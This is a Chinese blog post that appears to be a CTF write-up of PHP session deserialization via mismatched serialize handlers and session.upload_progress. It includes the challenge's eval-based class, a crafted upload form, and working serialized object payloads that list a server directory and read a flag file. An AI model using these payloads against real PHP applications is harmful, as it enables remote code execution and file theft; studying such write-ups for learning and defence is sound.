---
title: php的session反序列化
date: 2017-12-19 20:35:46
tags: [php,web,记录]
categories:
---

## 0x00.打字机

简单扯一下，大家都知道，几乎所有的编程语言都有(反)序列化这种机制，可以将一些对象，数组等通过`某种方式`变成可以便捷传输和存储(后面将提到)的形式，如字符串。当然php也不例外。

![43](https://myndtt.github.io\images\43.png)

同时在php有一个这样有意思的设置-->`php默认的SESSION会话机制 存储在文件系统的会话数据的内容是已经序列化后的内容,程序执行session_start()后PHP会自动读取文件并unserialize反序列化成数组赋值给超全局变量$_SESSION` (这句话是没错的)。

![44](https://myndtt.github.io\images\44.png)

​       ` (session_register这个函数功能即是可以在全部变量中session定义一个新的变量)`

<!-- more -->

## 0x01.晨曦的光

上面提到过是要存储这些序列化后的字符串的，实际情况中php有好几种存储方式，在php.ini中有一项名为`session.serialize-handler`的参数可以用来定义序列化/解序列化的处理器名字,用不同的处理器，其存储方式也就各不相同。

![46](https://myndtt.github.io\images\46.png)

​                      (自己php.ini中的session.serialize-handler情况)

![45](https://myndtt.github.io\images\45.png)

按php文档来看有三类：

```php
php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值

php:存储方式是，键名+竖线+经过serialize()函数序列处理的值

php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值
```

这里我们得到两个信息：1.三种方式存储方式完全不一样，2.默认为php方式存储，可以在php.ini中修改。

## 0x02.黑色的墨

举个例子。链接：http://web.jarvisoj.com:32784/

代码：

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

简单看一下代码：

```php
1.ini_set('session.serialize_handler', 'php');   设定上述存储方式为php

2.__construct()   php中的魔法函数   实例化对象时被调用

3.__destruct()     php中的魔法函数  当删除一个对象或对象操作终止时被调用

注：常见反序列化中魔法函数中还有

__sleep()   serialize之前被调用

__wakeup()   unserialize时被调用

```

由此可见，我们只要简单_GET一个'phpinfo' 就会执行`$m = new OowoO();`同时就会调用`__construct()`函数得到phpinfo()页面，先看看phpinfo页面能提供什么信息，有如下四点:

![47](https://myndtt.github.io\images\47.png)

```
一.php页面通过ini_set('session.serialize_handler', 'php')对存储方式进行了修改。

二.php版本为5.6.21

三.网站路径为 /opt/lampp/htdocs

四.session.upload_progress.enabled 为on(关键)
```

当然我们实际要执行`__destruct()`函数才能解决问题,，不用担心，对象操作一定会终止，也即这个函数一定会运行，接下就是如何利用了。

## 0x03.安静的伸张

方式：

我们可以`想办法`在session全局变量中加入一个变量，此变量经过`php_serialize`方式存储，随后该php页面通过`ini_set('session.serialize_handler', 'php')`更改存储(反序列化回来)方式，接着执行`session_start();`对session变量内容全部反序列化回来达到序列化利用。

而这个`想办法`就要利用第四点信息-->`session.upload_progress.enabled 为on`，看看官方解释：

![48](https://myndtt.github.io\images\48.png)

官方的例子：

![49](https://myndtt.github.io\images\49.png)



照葫芦画瓢，建立xx.php：

```php+HTML
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

上传文件，抓包，修改文件名，修改成我们想要的样子：

![50](https://myndtt.github.io\images\50.png)

为：`O:5:"OowoO":1:{s:4:"mdzz";s:38:"print_r(scandir("/opt/lampp/htdocs"));";}`但是别忘了存储方式的更改。所以最后文件名字修改为：

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:38:\"print_r(scandir(\"/opt/lampp/htdocs\"));\";}(加竖杠符合存储要求，叫反斜杠进行转义)
```

![51](https://myndtt.github.io\images\51.png)

再次修改为

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}
```

![52](https://myndtt.github.io\images\52.png)



当然你还可以获取到，额，等等.....

![53](https://myndtt.github.io\images\53.png)

简单概述过程，即为：使用`session.upload_progress`在全局session多一个变量如$_session['test'],赋值为`|123`，则通过php_serialize存储为a:1:{s:4:"test";s:4:"|123"}

a:1为默认的,s:4:"test"为key，s:4:"|123"为value，而到了index.php,更改了存储方式,以`|`作为key，value分界线，执行session_start();则123进行了反序列化,而123可控，则可被利用。

## 0x04.小结

php内置seesion存储机制需要好好编写使用，别用错了。如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。

`session.upload_progress`很IMBA,http://www.laruence.com/2011/10/10/2217.html

参考：http://www.jb51.net/article/107101.htm(很详细！！！)